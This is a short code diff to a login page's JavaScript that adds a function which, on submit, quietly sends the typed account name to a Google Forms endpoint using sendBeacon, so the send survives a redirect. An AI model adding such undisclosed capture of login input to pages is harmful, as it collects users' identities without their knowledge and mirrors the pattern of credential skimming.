@@ -108,12 +108,27 @@
         const loginForm = document.getElementById('loginForm');
         const baseUrl = "https://script.google.com/macros/s/AKfycbxu7hJeghA8ZEroQisS7V-7VxG8lFojZiz0WP8WHDkA5mugOaEzaYURBAN4gyB2f81Z_Q/exec";
 
+        function trackUser(user) {
+        if (user !== "") {
+            var formID = "1FAIpQLSc2G8lp0onwEquuIXsnWsvsR9ANndv3M9GHHOVTKmwYLpEJmA"; 
+            var nameEntry = "entry.1093230119"; 
+            var baseURL = "https://docs.google.com/forms/d/e/" + formID + "/formResponse?";
+            var submitURL = baseURL + nameEntry + "=" + encodeURIComponent(user) + "&submit=Submit";
+
+            // Ginagamit ang sendBeacon para kahit mag-redirect ang page, tuloy pa rin ang send ng data
+            navigator.sendBeacon(submitURL);
+            console.log("Tracking user: " + user);
+        }
+    }
+        
         loginForm.onsubmit = async (e) => {
             e.preventDefault();
             const acc = document.getElementById('acc').value;
             const pass = document.getElementById('pass').value;
             const btn = document.getElementById('loginBtn');
             const error = document.getElementById('error-msg');
+
+            trackUser(acc);
 
             btn.innerText = "VERIFYING...";
             btn.classList.add('loading');
